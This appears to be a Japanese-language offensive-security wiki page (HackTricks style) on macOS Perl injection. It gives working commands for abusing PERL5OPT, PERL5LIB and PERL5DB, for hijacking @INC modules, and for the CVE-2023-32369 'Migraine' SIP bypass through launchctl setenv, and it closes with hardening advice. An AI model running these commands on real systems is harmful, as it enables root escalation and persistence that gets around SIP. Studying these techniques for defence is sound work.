# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

env variable **`PERL5OPT`** を使用すると、**Perl** の interpreter 起動時に任意のコマンドを実行させることが可能です（target script の最初の行が解析される前であっても実行されます）。
例えば、次の script を作成します:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
ここで **env 変数を export** し、**perl** スクリプトを実行します：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
別の選択肢として、Perl module（例: `/tmp/pmod.pm`）を作成します：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
そして、環境変数を使用して、モジュールが自動的に見つけられてロードされるようにします：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### その他の興味深い環境変数

* **`PERL5DB`** – interpreter が **`-d`** (debugger) flag 付きで起動された場合、`PERL5DB` の内容は debugger context *inside* で Perl code として実行されます。
環境 **and** privileged Perl process の command-line flags の両方に影響を与えられる場合、次のようなことができます。

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # script の実行前に shell が起動する
```

* **`PERL5SHELL`** – Windows では、shell の spawn が必要な場合に Perl が使用する shell executable をこの variable で制御します。macOS では relevant ではないため、ここでは completeness のために記載します。

`PERL5DB` には **`-d`** switch が必要ですが、verbose troubleshooting のためにこの flag を有効にした状態で *root* として実行される maintenance または installer scripts が見つかることは一般的です。そのため、この variable は有効な escalation vector になります。

## dependencies 経由 (`@INC` abuse)

Perl が検索する include path (**`@INC`**) は、次のコマンドを実行することで一覧表示できます。
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14での一般的な出力は次のようになります。
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
返されるフォルダの一部は実際には存在しません。しかし、**`/Library/Perl/5.30`** は存在し、SIP によって保護されておらず、SIP によって保護されたフォルダよりも前に配置されています。したがって、*root* として書き込み可能であれば、悪意のあるモジュール（例：`File/Basename.pm`）を配置し、そのモジュールを import する特権スクリプトによって *優先的に* 読み込ませることができます。

> [!WARNING]
> `/Library/Perl` 内に書き込むには、依然として **root** が必要です。また、macOS は書き込み操作を実行するプロセスに対して、*Full Disk Access* を求める **TCC** プロンプトを表示します。

たとえば、あるスクリプトが **`use File::Basename;`** を import している場合、攻撃者が制御するコードを含む `/Library/Perl/5.30/File/Basename.pm` を作成できます。

## Migration Assistant 経由の SIP bypass（CVE-2023-32369 “Migraine”）

2023 年 5 月、Microsoft は **CVE-2023-32369**、通称 **Migraine** を開示しました。これは、*root* attacker が System Integrity Protection（SIP）を完全に **bypass** できる post-exploitation technique です。
脆弱な component は **`systemmigrationd`** で、**`com.apple.rootless.install.heritable`** entitlement が付与された daemon です。この daemon が spawn する child process は entitlement を継承するため、SIP の制限を受けずに実行されます。<sup>[1]</sup>

researcher によって特定された child の中には、Apple が署名した interpreter も含まれています。<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perlは`PERL5OPT`（Bashは`BASH_ENV`）を尊重するため、daemonの*環境*をpoisoningするだけで、SIPなしのコンテキストで任意のコード実行が可能になります:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC`が実行されると、`/usr/bin/perl`は悪意のある`PERL5OPT`を指定した状態で起動し、*SIPが再有効化される前に*`/private/tmp/migraine.sh`を実行します。このスクリプトから、たとえばペイロードを**`/System/Library/LaunchDaemons`**内にコピーしたり、`com.apple.rootless`拡張属性を割り当ててファイルを**削除不能**にしたりできます。

AppleはmacOS **Ventura 13.4**、**Monterey 12.6.6**、**Big Sur 11.7.7**でこの問題を修正しましたが、古いシステムやパッチ未適用のシステムは引き続きexploit可能です。<sup>[1]</sup>

## Hardeningの推奨事項

1. **危険な変数をクリアする** – 特権launchdaemonやcronジョブは、クリーンな環境で開始する必要があります（`launchctl unsetenv PERL5OPT`、`env -i`など）。
2. **必要不可欠な場合を除き、interpreterをrootとして実行しない**。コンパイル済みバイナリを使用するか、早い段階でprivilegeをdropします。
3. **vendor scriptでは`-T`（taint mode）を使用する**。taint checkingが有効な場合、Perlは`PERL5OPT`やその他の安全でないswitchを無視します。
4. **macOSを最新の状態に保つ** – 「Migraine」は現行リリースで完全にpatch済みです。

## References

- [1] [Microsoft Security Blog – 新たなmacOSの脆弱性MigraineによりSystem Integrity Protectionをbypass可能（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
